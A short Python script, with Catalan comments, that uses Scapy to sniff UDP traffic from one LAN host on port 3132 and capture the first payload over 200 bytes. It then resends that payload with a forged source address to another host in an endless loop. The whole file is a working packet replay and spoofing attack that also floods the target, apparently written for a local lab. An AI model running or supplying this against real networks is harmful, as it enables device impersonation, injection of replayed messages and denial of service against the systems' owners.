from scapy.all import sniff, IP, UDP, Raw, send
import time

# 📡 Configuració de xarxa
INTERFACE = "enp0s3"
FILTER = "udp and src host 192.168.0.100 and src port 3132"
DST_IP = "192.168.0.102"
DST_PORT = 3132

captured_payload = None  # Per guardar el missatge llarg

print(f"\n🎧 Escoltant paquets a {INTERFACE}...\n")

def packet_handler(packet):
    global captured_payload

    if IP in packet and UDP in packet and Raw in packet:
        payload = packet[Raw].load
        print(f"📥 Rebut paquet de {len(payload)} bytes")

        if len(payload) > 200:
            print("✅ Missatge gran detectat! Guardant i deixant d'escoltar...")
            captured_payload = payload
            return True  # Atura el sniffing

# 🕵️ Escoltar fins trobar un paquet gran
sniff(filter=FILTER, iface=INTERFACE, prn=packet_handler, stop_filter=lambda p: captured_payload is not None)

# 🚀 Enviament continu si s'ha capturat un paquet
if captured_payload:
    spoofed_packet = IP(src="192.168.0.100", dst=DST_IP) / \
                     UDP(sport=3132, dport=DST_PORT) / \
                     Raw(load=captured_payload)

    print(f"\n🚀 Reenviant paquet capturat de {len(captured_payload)} bytes indefinidament...\n")
    while True:
        send(spoofed_packet, iface=INTERFACE, verbose=False)

